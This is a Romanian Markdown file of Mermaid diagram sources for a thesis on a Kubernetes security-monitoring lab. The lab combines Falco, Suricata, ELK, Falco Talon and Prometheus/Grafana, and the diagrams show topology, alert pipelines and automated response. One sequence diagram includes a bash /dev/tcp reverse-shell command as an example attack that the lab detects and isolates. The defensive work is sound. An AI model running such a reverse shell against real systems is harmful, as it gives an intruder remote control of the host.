# Diagrame — fluxuri & interconectare (surse Mermaid)

Surse text pentru diagramele tezei. Se randează nativ în GitHub și în VSCode (extensia
*Markdown Preview Mermaid Support*). Pentru export vector pentru tipar: deschide în
<https://mermaid.live>, sau `mmdc -i flows.md -o out.svg` (mermaid-cli), și exportă **SVG/PDF**.

Convenții de culoare:
- 🟦 Falco (runtime/syscall) · 🟥 Suricata (network IDS) · 🟩 ELK (colectare/corelare) ·
  🟨 Falco Talon (răspuns) · ⬜ workload-uri/ținte.

---

## 1. Arhitectura K8s + plasarea componentelor (blueprint)

> Versiune Mermaid a topologiei — utilă ca ciornă/blueprint. Pentru varianta „de teză" (icoane
> oficiale, layout fin) redesenează în draw.io pornind de la `architecture.drawio`.

```mermaid
flowchart TB
  subgraph CL["Cluster MicroK8s v1.32 (4× VM Ubuntu 22.04, datacenter facultate)"]
    direction TB

    subgraph N1["node-1 · 10.11.0.249 — control-plane"]
      n1f["Falco DaemonSet"]
      n1d["dqlite (API server store)"]
    end

    subgraph N2["node-2 · 10.11.0.214 — worker (senzor Suricata)"]
      n2f["Falco DaemonSet"]
      n2s["Suricata (systemd) — sensor ens3"]
      n2fs["falcosidekick (router)"]
      n2a["attack-pod (sursă atac)"]
    end

    subgraph N3["node-3 · 10.11.0.70 — worker aplicații (senzor Suricata)"]
      n3f["Falco DaemonSet"]
      n3s["Suricata (systemd) — sensor ens3"]
      n3d["DVWA / juice-shop (ținte)"]
    end

    subgraph N4["node-4 · 10.11.0.3 — monitoring (floating IP 10.102.14.31)"]
      n4f["Falco DaemonSet"]
      n4t["Falco Talon (răspuns)"]
      subgraph ELK["ELK — systemd, ÎN AFARA K8s"]
        ls["Logstash :5044/:5045"]
        es["Elasticsearch :9200"]
        kb["Kibana :5601"]
      end
      obs["Prometheus + Grafana (metrici)"]
    end
  end

  admin["Administrator / Analist de securitate — kubectl/helm + dashboards (Kibana/Grafana), de pe orice device cu kubeconfig"]

  n1f & n2f & n3f & n4f --> n2fs
  n2s & n3s --> ls
  n2fs --> ls
  ls --> es --> kb
  n2fs --> n4t
  admin -. "10.102.14.31:9200/:5601" .-> ELK
  n2a -. "atac" .-> n3d

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  classDef talon fill:#fef3c7,stroke:#92400e;
  class n1f,n2f,n3f,n4f falco;
  class n2s,n3s suri;
  class ls,es,kb elk;
  class n4t talon;
```

---

## 2. Flux de colectare loguri + alertare (pipeline → index unic)

```mermaid
flowchart LR
  subgraph SRC["Surse de detecție (în cluster)"]
    falco["🟦 Falco DaemonSet<br/>(syscall/runtime, toate nodurile)"]
    suri["🟥 Suricata systemd<br/>(node-2 + node-3, EVE JSON)"]
  end

  fs["falcosidekick<br/>(router alerte Falco)"]
  fb["Filebeat<br/>(sidecar/agent eve.json)"]

  subgraph ELK["🟩 ELK (systemd pe node-4)"]
    ls["Logstash<br/>:5045 HTTP ⟵ Falco<br/>:5044 Beats ⟵ Suricata<br/>(normalizare ECS)"]
    es["Elasticsearch<br/>index zilnic <b>security-YYYY.MM.dd</b>"]
    kb["Kibana<br/>dashboards + corelare cross-tool"]
  end

  falco -->|"webhook JSON"| fs -->|"HTTP :5045"| ls
  suri -->|"eve.json"| fb -->|"Beats :5044"| ls
  ls -->|"tags: falco / suricata"| es --> kb

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  class falco falco;
  class suri suri;
  class ls,es,kb elk;
```

**Idee cheie de subliniat în teză:** ambele surse (host-based Falco + network-based Suricata) sunt
normalizate de Logstash și aterizează în **același index `security-*`**, diferențiate prin câmpul
`tags` → corelarea cross-tool se face în Kibana peste câmpuri comune (`@timestamp`,
`k8s.pod.name`/`container.id`, `dest_ip`).

---

## 3. IDS/IPS + Falco + ELK — interconectare pe straturi

```mermaid
flowchart TB
  subgraph L1["Strat 1 — Senzori (detecție)"]
    direction LR
    falco["🟦 <b>Falco</b><br/>runtime/syscall (eBPF)<br/>reguli K8S_THREAT + default"]
    suri["🟥 <b>Suricata</b><br/>network IDS (AF_PACKET, VXLAN-decode)<br/>ET Open + reguli custom (sid 1000010-12)"]
  end

  subgraph L2["Strat 2 — Transport & normalizare"]
    fs["falcosidekick"]
    fb["Filebeat"]
    ls["Logstash (ECS)"]
  end

  subgraph L3["Strat 3 — Stocare & analiză"]
    es["Elasticsearch<br/>security-* + falco-talon-*"]
    kb["Kibana (Overview, MITRE, corelare)"]
  end

  subgraph L4["Strat 4 — Răspuns automat"]
    talon["🟨 <b>Falco Talon</b><br/>label · isolate (NetworkPolicy) · terminate"]
  end

  falco --> fs
  suri --> fb --> ls
  fs --> ls --> es --> kb
  fs -->|"output: talon"| talon
  talon -->|"acțiuni"| k8s["K8s API (NetworkPolicy / label / delete pod)"]
  talon -->|"ES notifier"| es

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  classDef talon fill:#fef3c7,stroke:#92400e;
  class falco falco;
  class suri suri;
  class es,kb,ls elk;
  class talon talon;
```

---

## 4. Secvență — de la atac la detecție + răspuns (ex: reverse shell)

```mermaid
sequenceDiagram
    autonumber
    participant A as attack-pod
    participant F as Falco (node-2)
    participant S as falcosidekick
    participant L as Logstash
    participant E as Elasticsearch
    participant K as Kibana
    participant T as Falco Talon
    participant API as K8s API

    A->>A: bash -i >& /dev/tcp/.../4444 (reverse shell)
    F->>F: regula K8S_THREAT: Reverse Shell - Command Pattern
    F->>S: alertă (webhook JSON)
    par Detecție (logging)
        S->>L: HTTP :5045
        L->>E: index security-* (tags: falco)
        E->>K: vizibil în dashboard
    and Răspuns automat
        S->>T: output "talon"
        T->>API: Label compromised=true
        T->>API: NetworkPolicy (isolate egress)
        T->>E: ES notifier → index falco-talon-*
    end
    Note over A,API: Izolare reversibilă: kubectl delete networkpolicy + remove label
```

---

## 5. Pipeline metrici (Prometheus + Grafana) — planul secundar de observabilitate

> Separat de pipeline-ul de securitate. Diferența-cheie: metricile sunt **PULL** (Prometheus face
> *scrape* periodic pe `/metrics`), spre deosebire de telemetria de securitate (Falco/Suricata) care e
> **PUSH** (evenimentele sunt împinse spre Logstash când se întâmplă). Scop: sănătatea clusterului
> (CPU/RAM/disk per nod + control-plane), NU detecția de amenințări.

```mermaid
flowchart LR
  subgraph SRC["Surse de metrici (în cluster)"]
    ne["node-exporter<br/>(DaemonSet, toate nodurile)<br/>CPU · RAM · disk · net per nod"]
    ksm["kube-state-metrics<br/>starea obiectelor K8s<br/>(pods, deployments, ...)"]
  end

  prom["Prometheus<br/>scrape periodic (PULL) → TSDB<br/>20Gi PVC · retenție 10d · PromQL"]
  graf["Grafana<br/>datasource Prometheus → dashboards"]
  admin["Administrator<br/>acces via port-forward :3000"]

  ne -->|"GET /metrics (scrape)"| prom
  ksm -->|"GET /metrics (scrape)"| prom
  prom -->|"PromQL"| graf
  admin -. "port-forward :3000" .-> graf

  classDef m fill:#e6e6fa,stroke:#5b5bd6;
  class ne,ksm,prom,graf m;
```

**Contrast cu pipeline-ul de securitate (diagrama #2):** acolo Falco/Suricata *împing* (push) evenimente
spre Logstash → ES → Kibana; aici Prometheus *trage* (pull) metrici de pe endpoint-uri, le stochează în
TSDB-ul propriu și Grafana le interoghează cu PromQL. Două planuri de observabilitate distincte, cu
modele de colectare opuse.

---

> **Notă Suricata (cross-node):** un senzor vede doar `ens3`-ul nodului său. Principiul *sensor-near-target*:
> senzorul de pe node-3 (lângă DVWA) prinde atacurile spre workload-uri indiferent de nodul atacatorului;
> senzorul node-2 prinde outbound-ul attack-pod. De aceea atacatorul (attack-pod) e pe **node-2**, iar
> țintele pe **node-3** (vezi `suricata/README.md`).
